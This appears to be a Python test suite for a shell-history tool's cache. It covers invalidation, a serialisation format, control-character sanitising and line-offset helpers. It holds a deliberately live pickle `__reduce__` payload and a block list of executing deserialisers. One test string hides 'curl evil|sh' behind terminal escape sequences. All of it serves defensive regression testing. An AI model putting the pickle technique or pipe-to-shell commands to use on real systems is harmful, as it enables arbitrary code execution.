"""Incremental cache behaviour, especially the invalidation paths."""

from __future__ import annotations

import os
import pathlib
import pickle
import tempfile
import unittest
from pathlib import Path

from woswoar import cache, entry, store
from woswoar.entry import Entry, format_line

from .support import MACHINE_ID, WoswoarTestCase, make_entry


class _Exploit:
    """A pickle that runs code on load, which is the whole point of issue #21.

    `__reduce__` is what `pickle.load` calls, before any `isinstance` check the
    caller might make. Creating a file rather than doing anything dangerous:
    the test needs a witness, not a demonstration.
    """

    def __init__(self, path: str) -> None:
        self.path = path

    def __reduce__(self) -> tuple[object, tuple[object, ...]]:
        return (pathlib.Path(self.path).touch, ())


def line(ts: int, cmd: str) -> str:
    """One log line, using the shared fixture defaults."""
    return format_line(make_entry(ts, cmd))


def bump_mtime(path: object) -> None:
    """Push mtime forward so a same-size rewrite is still detectable.

    Filesystem timestamp granularity means two writes in the same test can land
    on an identical mtime, which would mask a change the code is supposed to
    catch.
    """
    stat = os.stat(path)  # type: ignore[arg-type]
    os.utime(path, ns=(stat.st_atime_ns, stat.st_mtime_ns + 2_000_000_000))  # type: ignore[arg-type]


class TestCache(WoswoarTestCase):
    def test_builds_from_empty(self) -> None:
        self.write_log(MACHINE_ID, "2026-07-29", [line(100, "git status")])
        entries = cache.load_entries()
        self.assertEqual([e.cmd for e in entries], ["git status"])

    def test_no_logs_is_not_an_error(self) -> None:
        self.assertEqual(cache.load_entries(), [])

    def test_reads_only_the_appended_tail(self) -> None:
        path = self.write_log(MACHINE_ID, "2026-07-29", [line(100, "first")])
        self.assertEqual(len(cache.load_entries()), 1)

        with path.open("a", encoding="utf-8") as handle:
            handle.write(line(200, "second") + "\n")

        loaded = cache.load()
        before = dict(loaded.meta)
        self.assertTrue(cache.refresh(loaded))
        self.assertEqual([e.cmd for e in loaded.entries()], ["first", "second"])
        # The offset advanced rather than resetting, i.e. this was a tail read.
        relpath = f"hosts/{MACHINE_ID}/2026-07-29.tsv"
        self.assertGreater(loaded.meta[relpath].offset, before[relpath].offset)

    def test_unchanged_file_is_not_reparsed(self) -> None:
        self.write_log(MACHINE_ID, "2026-07-29", [line(100, "git status")])
        cache.load_entries()
        loaded = cache.load()
        self.assertFalse(cache.refresh(loaded))

    def test_shrunk_file_is_fully_reread(self) -> None:
        path = self.write_log(
            MACHINE_ID, "2026-07-29", [line(100, "first"), line(200, "second"), line(300, "third")]
        )
        self.assertEqual(len(cache.load_entries()), 3)

        # A rebase or a manual edit can make a file shorter. Trusting the stored
        # byte offset here would parse from the middle of a line.
        path.write_text(line(100, "first") + "\n", encoding="utf-8")
        self.assertEqual([e.cmd for e in cache.load_entries()], ["first"])

    def test_same_size_rewrite_is_detected(self) -> None:
        path = self.write_log(MACHINE_ID, "2026-07-29", [line(100, "aaaa")])
        self.assertEqual([e.cmd for e in cache.load_entries()], ["aaaa"])

        path.write_text(line(100, "bbbb") + "\n", encoding="utf-8")
        bump_mtime(path)
        # Size is identical, so only the head fingerprint can catch this.
        self.assertEqual([e.cmd for e in cache.load_entries()], ["bbbb"])

    def test_partial_trailing_line_is_not_consumed_until_complete(self) -> None:
        path = self.write_log(MACHINE_ID, "2026-07-29", [line(100, "complete")])
        with path.open("a", encoding="utf-8") as handle:
            handle.write("1753781234\tsess\t/tmp")  # no newline yet

        self.assertEqual([e.cmd for e in cache.load_entries()], ["complete"])

        with path.open("a", encoding="utf-8") as handle:
            handle.write("\t0\t5\tfinished\n")

        self.assertEqual([e.cmd for e in cache.load_entries()], ["complete", "finished"])

    def test_deleted_file_drops_its_entries(self) -> None:
        path = self.write_log(MACHINE_ID, "2026-07-29", [line(100, "gone")])
        self.write_log(MACHINE_ID, "2026-07-30", [line(200, "stays")])
        self.assertEqual(len(cache.load_entries()), 2)

        path.unlink()
        self.assertEqual([e.cmd for e in cache.load_entries()], ["stays"])

    def test_corrupt_cache_falls_back_to_a_rebuild(self) -> None:
        self.write_log(MACHINE_ID, "2026-07-29", [line(100, "git status")])
        cache.load_entries()

        store.cache_file().write_bytes(b"this is not a cache")
        self.assertEqual([e.cmd for e in cache.load_entries()], ["git status"])

    def test_a_pickle_is_not_loaded_and_cannot_execute(self) -> None:
        """Issue #21: the cache used to be a pickle, read on every Ctrl-R.

        `pickle.load` runs `__reduce__` before any validation, so the old
        `isinstance` guard was too late to matter. This writes a payload that
        would create a file if it were ever unpickled, and asserts it does not.
        """
        witness = self.root / "payload-ran"
        payload = pickle.dumps(_Exploit(str(witness)), protocol=pickle.HIGHEST_PROTOCOL)
        # Sanity-check the payload really is live, or this test proves nothing.
        pickle.loads(payload)
        self.assertTrue(witness.exists(), "the exploit payload is inert; the test is worthless")
        witness.unlink()

        self.write_log(MACHINE_ID, "2026-07-29", [line(100, "git status")])
        cache.load_entries()  # creates the cache directory, as a real run would
        store.cache_file().write_bytes(payload)

        self.assertEqual([e.cmd for e in cache.load_entries()], ["git status"])
        self.assertFalse(witness.exists(), "the cache file was unpickled")

    def test_a_cache_from_another_version_falls_back_to_a_rebuild(self) -> None:
        """The version is the file's first field, so it is checked before use."""
        self.write_log(MACHINE_ID, "2026-07-29", [line(100, "git status")])
        cache.load_entries()

        written = store.cache_file().read_bytes()
        self.assertTrue(written.startswith(b"woswoar-cache-"))
        store.cache_file().write_bytes(written.replace(b"woswoar-cache-2", b"woswoar-cache-1", 1))

        self.assertEqual([e.cmd for e in cache.load_entries()], ["git status"])

    def test_unparseable_lines_are_skipped_not_fatal(self) -> None:
        self.write_log(
            MACHINE_ID, "2026-07-29", [line(100, "good"), "garbage", line(200, "also good")]
        )
        self.assertEqual([e.cmd for e in cache.load_entries()], ["good", "also good"])

    def test_host_is_derived_from_the_path(self) -> None:
        self.write_log("aaaaaaaaaaaaaaaa", "2026-07-29", [line(100, "on a")])
        self.write_log("bbbbbbbbbbbbbbbb", "2026-07-29", [line(200, "on b")])
        hosts = {e.cmd: e.host for e in cache.load_entries()}
        self.assertEqual(hosts, {"on a": "aaaaaaaaaaaaaaaa", "on b": "bbbbbbbbbbbbbbbb"})

    def test_save_is_atomic_and_leaves_no_temp_files(self) -> None:
        self.write_log(MACHINE_ID, "2026-07-29", [line(100, "git status")])
        cache.load_entries()
        leftovers = [p.name for p in store.cache_dir().iterdir() if p.name.startswith(".cache-")]
        self.assertEqual(leftovers, [])


class TestNoFormatWeReadCanExecute(unittest.TestCase):
    """docs/security.md claims this of the whole codebase, so assert it there.

    The cache is the one that mattered and is fixed; this is what stops the
    next one being introduced quietly somewhere else.
    """

    def test_no_module_imports_an_executing_deserialiser(self) -> None:
        package = pathlib.Path(__file__).resolve().parent.parent / "woswoar"
        banned = ("pickle", "marshal", "shelve", "dill", "yaml")
        offenders = []
        for module in sorted(package.rglob("*.py")):
            source = module.read_text(encoding="utf-8")
            for name in banned:
                if f"import {name}" in source:
                    offenders.append(f"{module.name} imports {name}")
        self.assertEqual(
            offenders,
            [],
            "these formats run what they read; docs/security.md says none is used",
        )


class TestTheOnDiskFormat(WoswoarTestCase):
    """The serialiser on its own, without going through the filesystem."""

    RELPATH = "hosts/abc/2026-07-29.tsv"

    def sample(self, entries: list[Entry]) -> cache.Cache:
        """A cache holding these entries, in the columnar form it stores.

        The tests are written in `Entry` because that is what the format is
        *about*; the flattening is the storage detail, so it lives here rather
        than in every test.
        """
        built = cache.Cache()
        built.files[self.RELPATH] = [value for entry in entries for value in cache.fields_of(entry)]
        built.meta[self.RELPATH] = cache.FileMeta(
            size=10,
            mtime_ns=20,
            offset=30,
            head=b"\x00\xff\x01",
            host=entries[0].host if entries else MACHINE_ID,
        )
        return built

    def roundtrip(self, entries: list[Entry]) -> list[Entry]:
        return cache.loads(cache.dumps(self.sample(entries))).entries()

    def test_file_metadata_survives(self) -> None:
        built = self.sample([make_entry(1, "git status")])
        self.assertEqual(cache.loads(cache.dumps(built)).meta, built.meta)

    def test_awkward_content_survives(self) -> None:
        """Tabs, newlines and backslashes need no escaping in this format.

        They do in the *log*, which is tab-separated; the point of choosing
        separators no field can hold is that this layer escapes nothing.
        """
        entries = [
            make_entry(1, "awk -F'\t' '{print $1}'"),
            make_entry(2, "printf 'a\nb'"),
            make_entry(3, "grep -r 'C:\\\\Users' ."),
            make_entry(4, "echo über 😀 naïve"),
            make_entry(5, ""),
        ]
        self.assertEqual(self.roundtrip(entries), entries)

    def test_a_file_holding_a_separator_is_left_out_rather_than_altered(self) -> None:
        """Only reachable from a peer's chunk, and it must not desynchronise.

        Stripping the byte was tried first and is worse than it looks: the same
        command then renders one way from a warm cache and another after a
        rebuild. A cache is derived, so it must never change what you see.
        Omitting the file means it is re-parsed every run instead.
        """
        built = self.sample([make_entry(1, "echo \x00\x01\x02 marker")])
        restored = cache.loads(cache.dumps(built))
        self.assertEqual(restored.files, {})
        self.assertEqual(restored.meta, {}, "the file must be re-read, so it may keep no metadata")

    def test_one_poisoned_file_does_not_cost_the_others(self) -> None:
        built = self.sample([make_entry(1, "echo \x00 marker")])
        built.files["hosts/abc/2026-07-30.tsv"] = [
            value for entry in [make_entry(2, "git status")] for value in cache.fields_of(entry)
        ]
        built.meta["hosts/abc/2026-07-30.tsv"] = cache.FileMeta(1, 2, 3, b"", MACHINE_ID)
        restored = cache.loads(cache.dumps(built))
        self.assertEqual(list(restored.files), ["hosts/abc/2026-07-30.tsv"])

    def test_a_file_with_no_entries_survives(self) -> None:
        self.assertEqual(self.roundtrip([]), [])

    def test_repeated_values_are_shared_not_copied(self) -> None:
        """30% of retained memory on a real history, for no measurable time."""
        entries = [make_entry(i, f"cmd {i}") for i in range(50)]
        restored = self.roundtrip(entries)
        self.assertEqual(len({id(e.cwd) for e in restored}), 1)
        self.assertEqual(len({id(e.session) for e in restored}), 1)

    def test_a_cache_from_another_version_is_refused(self) -> None:
        """The version guard, tested where it acts rather than through a rebuild.

        Going through `load_entries` cannot see this: a cache with a stale magic
        but a current *shape* still parses into the right entries, so the round
        trip passes whether the check runs or not.
        """
        original = cache.Cache()
        original.files["hosts/abc/2026-07-29.tsv"] = [
            value for entry in [make_entry(1, "git status")] for value in cache.fields_of(entry)
        ]
        original.meta["hosts/abc/2026-07-29.tsv"] = cache.FileMeta(0, 0, 0, b"", MACHINE_ID)
        blob = cache.dumps(original)

        self.assertEqual(cache.loads(blob).files, original.files)
        for magic in (b"woswoar-cache-1", b"woswoar-cache-99", b"", b"pickle"):
            with self.subTest(magic=magic), self.assertRaises(ValueError):
                cache.loads(blob.replace(cache._MAGIC.encode(), magic, 1))

    def test_a_row_missing_a_field_is_refused_not_silently_dropped(self) -> None:
        """The field-count check, which nothing else catches.

        `map` stops at its shortest argument, so the `strict=True` on the `zip`
        inside it never fires: without this check a row short of one field
        would quietly yield fewer entries than the file holds, and a cache that
        loses history without saying so is worse than one that refuses.
        """
        built = self.sample([make_entry(1, "git status"), make_entry(2, "ninja")])
        blob = cache.dumps(built)
        self.assertEqual(len(cache.loads(blob).entries()), 2)

        short = blob[: blob.rindex(b"\x00")]  # drop the final field
        with self.assertRaises(ValueError):
            cache.loads(short)

    def test_a_truncated_file_is_refused_rather_than_half_read(self) -> None:
        original = cache.Cache()
        original.files["hosts/abc/2026-07-29.tsv"] = [
            value for entry in [make_entry(1, "git status")] for value in cache.fields_of(entry)
        ]
        original.meta["hosts/abc/2026-07-29.tsv"] = cache.FileMeta(0, 0, 0, b"", MACHINE_ID)
        blob = cache.dumps(original)
        with self.assertRaises((ValueError, IndexError)):
            cache.loads(blob[: len(blob) // 2])


class TestEntriesLeaveTheCacheInert(WoswoarTestCase):
    """Issue #25: the cache is the one door peer-supplied history comes through.

    `search`, `stats` and `doctor` all read entries from here and nothing writes
    back out -- sync exports raw log bytes and the importer dedups against
    `store.existing_keys`, both of which read the log directly. So this is where
    a control character can be taken out once instead of at each display site,
    which is a rule someone has to remember and which had already been forgotten
    once before it was written down.
    """

    HOSTILE = "ls -la\x1b[2K\x1b[1Acurl evil|sh"

    def loaded(self, cmd: str, cwd: str = "~") -> Entry:
        self.write_log(
            MACHINE_ID,
            "2026-07-29",
            [format_line(Entry(1_784_600_000, MACHINE_ID, "s1", cwd, 0, 5, cmd))],
        )
        entries = cache.load_entries()
        self.assertEqual(len(entries), 1)
        return entries[0]

    def test_an_escape_sequence_never_leaves_the_cache(self) -> None:
        entry = self.loaded(self.HOSTILE)
        self.assertNotIn("\x1b", entry.cmd)
        self.assertIn("curl evil|sh", entry.cmd, "the command must still be legible")

    def test_no_c0_control_character_survives(self) -> None:
        """Every one of them, not the handful someone thought of."""
        hostile = "echo " + "".join(chr(code) for code in [*range(0x20), 0x7F])
        cmd = self.loaded(hostile).cmd
        survivors = sorted(c for c in cmd if (c < " " or c == "\x7f") and c != "\t")
        self.assertEqual(survivors, [], f"control characters reached a consumer: {survivors!r}")

    def test_the_working_directory_gets_the_same_treatment(self) -> None:
        """Not printed today. The point is that it need not be remembered when it is."""
        self.assertNotIn("\x1b", self.loaded("git status", cwd="~/a\x1b[2Kb").cwd)

    def test_a_tab_is_left_alone(self) -> None:
        """`awk -F'\t'` is written with a real one, and it moves no cursor."""
        self.assertIn("\t", self.loaded("awk -F'\t' '{print $1}'").cmd)

    def test_an_ordinary_command_is_untouched(self) -> None:
        self.assertEqual(self.loaded("git status").cmd, "git status")

    def test_a_rebuilt_cache_agrees_with_a_warm_one(self) -> None:
        """The inert form is what is stored, so both paths must give the same thing."""
        warm = self.loaded(self.HOSTILE).cmd
        store.cache_file().unlink()
        self.assertEqual(cache.load_entries()[0].cmd, warm)


class TestReadTailReturnsWholeLinesOnly(unittest.TestCase):
    """The incremental reader every export and cache rebuild sits on.

    8 of its 17 mutants survived the whole-package run, and the interesting one
    is `cut < 0` becoming `cut <= 0`: with a tail whose *first* byte is a
    newline, `rfind` can legitimately return 0, and the mutant then reports "no
    complete line here" and leaves the offset where it was. That line is read
    again next time or never, depending on what follows -- which is a history
    file silently losing or repeating a command.

    No fixture in the suite started a tail with a newline, so nothing could see
    it. Driven against real files, since the whole function is file offsets.
    """

    def tail(self, body: bytes, offset: int = 0) -> tuple[bytes, int]:
        with tempfile.TemporaryDirectory() as box:
            path = Path(box) / "log"
            path.write_bytes(body)
            return store.read_tail(path, offset)

    def test_a_tail_that_begins_with_a_newline(self) -> None:
        """`rfind` returns 0 here, which is a real cut, not "not found"."""
        data, offset = self.tail(b"\n")
        self.assertEqual(data, b"\n")
        self.assertEqual(offset, 1)

    def test_a_partial_final_line_is_left_for_next_time(self) -> None:
        data, offset = self.tail(b"one\ntwo\nthre")
        self.assertEqual(data, b"one\ntwo\n")
        self.assertEqual(offset, 8, "the partial line must not be consumed")

    def test_no_newline_at_all_consumes_nothing(self) -> None:
        data, offset = self.tail(b"incomplete")
        self.assertEqual((data, offset), (b"", 0))

    def test_it_resumes_from_the_offset_it_returned(self) -> None:
        """The contract the caller relies on: reading twice yields each line
        once. A fixture that only ever reads from 0 cannot check it."""
        body = b"one\ntwo\n"
        first, offset = self.tail(body)
        second, final = self.tail(body, offset)
        self.assertEqual(first, body)
        self.assertEqual((second, final), (b"", len(body)))

    def test_a_missing_file_is_not_an_error(self) -> None:
        with tempfile.TemporaryDirectory() as box:
            self.assertEqual(store.read_tail(Path(box) / "absent", 0), (b"", 0))


class TestAWatermarkIsSnappedBackToItsLine(unittest.TestCase):
    """`store.line_start`, the guard `read_tail` used to get for free (#263).

    Every watermark `read_tail` produces names the start of a line, so while the
    logs were strictly append-only nothing could hand `export` an offset that
    did not. `forget` can shorten a log, and a crash between its rewrite and its
    `state.save` leaves the mark inside a record -- after which `export` seals a
    fragment no peer can parse, in a repository where it cannot be fixed.

    Driven against real files, as the class above is: the whole function is file
    offsets, and a fixture that mocked the read would be asserting the belief.
    """

    def start(self, body: bytes, offset: int) -> int:
        with tempfile.TemporaryDirectory() as box:
            path = Path(box) / "log"
            path.write_bytes(body)
            return store.line_start(path, offset)

    def test_a_mark_already_on_a_boundary_is_left_alone(self) -> None:
        """The overwhelmingly common case, and the one that must cost nothing:
        every mark `read_tail` ever returned is of this shape."""
        self.assertEqual(self.start(b"one\ntwo\n", 4), 4)

    def test_a_mark_inside_a_record_moves_back_to_where_it_began(self) -> None:
        self.assertEqual(self.start(b"one\ntwo\n", 6), 4)

    def test_the_start_of_the_file_is_a_boundary(self) -> None:
        self.assertEqual(self.start(b"one\ntwo\n", 0), 0)

    def test_a_file_with_no_newline_before_the_mark_starts_over(self) -> None:
        """Not a log this wrote. Re-publishing the day is duplicate rows on a
        peer; sealing from the middle of one is a record no peer can read."""
        self.assertEqual(self.start(b"no newlines here", 5), 0)

    def test_a_missing_file_leaves_the_mark_where_it_was(self) -> None:
        """`export`'s own `OSError` guard is what handles the file being gone;
        this must not answer 0 and re-publish a day that is not there."""
        with tempfile.TemporaryDirectory() as box:
            self.assertEqual(store.line_start(Path(box) / "absent", 40), 40)

    def test_a_mark_far_past_the_window_still_finds_its_line(self) -> None:
        """The fixture every other one here is too small to be.

        `start` is `max(0, offset - _LINE_WINDOW)`, and in a file smaller than
        the window that is always 0 -- which makes the seek and the read length
        indistinguishable from having no window at all. Only a mark more than
        64 KiB into a file separates them: without the seek the window is the
        *beginning* of the file, and its last newline is nowhere near the mark.
        """
        head = b"first\n"
        filler = b"".join(b"line %d\n" % n for n in range(20_000))
        body = head + filler
        mark = len(body) - 4  # inside the last record
        wanted = body.rfind(b"\n", 0, mark) + 1
        self.assertGreater(mark, store._LINE_WINDOW, "the fixture must exceed the window")
        self.assertEqual(self.start(body, mark), wanted)

    def test_a_newline_exactly_at_the_window_edge_is_a_real_cut(self) -> None:
        """`rfind` returning 0 is a position, not "not found" -- the same trap
        `read_tail` above documents, one function over.

        It needs the newline to land exactly on the first byte of the window,
        which is `offset - _LINE_WINDOW`. Nothing else in this class can reach
        that alignment, so `cut >= 0` reads as tested against `> 0` without it.
        """
        start = 10
        offset = start + store._LINE_WINDOW
        body = b"x" * start + b"\n" + b"y" * (offset - start)
        self.assertEqual(self.start(body, offset), start + 1)

    def test_no_newline_in_a_window_that_does_not_reach_the_file_start(self) -> None:
        """The other half of the same comparison. With `cut` of -1 and a `start`
        of 0 -- every small fixture -- `start + cut + 1` is 0, which is what the
        `else` says anyway; only a window that begins part way into the file
        tells `cut >= 0` from `cut >= -1`, and getting that wrong seals from the
        middle of a record instead of starting the day over."""
        body = b"first\n" + b"z" * 200_000
        offset = 150_000
        self.assertGreater(offset - store._LINE_WINDOW, 0, "the window must not reach byte 0")
        self.assertEqual(self.start(body, offset), 0)

    def test_it_looks_further_back_than_the_longest_record(self) -> None:
        """The window has to clear `entry.MAX_CMD_CHARS` and its escaping, or a
        legitimate long command would be read as "not a log this wrote" and
        re-publish the whole day."""
        line = b"x" * (entry.MAX_CMD_CHARS * 2)
        self.assertEqual(self.start(b"first\n" + line + b"\n", 6 + len(line) // 2), 6)


if __name__ == "__main__":
    unittest.main()
